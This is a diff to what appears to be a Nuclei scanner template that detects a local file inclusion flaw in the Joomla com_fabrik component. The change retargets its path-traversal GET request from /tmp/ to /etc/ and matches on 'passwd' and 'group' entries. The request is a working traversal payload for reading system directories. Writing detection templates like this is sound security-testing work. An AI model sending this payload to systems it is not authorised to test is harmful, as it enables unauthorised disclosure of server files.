@@ -4,16 +4,16 @@ http:
     part: body
     type: word
     words:
-    - '"value":'
+    - '"value":"passwd"'
+    - '"value":"group"'
     - '"disable":false'
-    - text
   - status:
     - 200
     type: status
   matchers-condition: and
   method: GET
   path:
-  - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/'
+  - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/'
 id: joomla-com-fabrik-lfi
 info:
   author: dhiyaneshDk
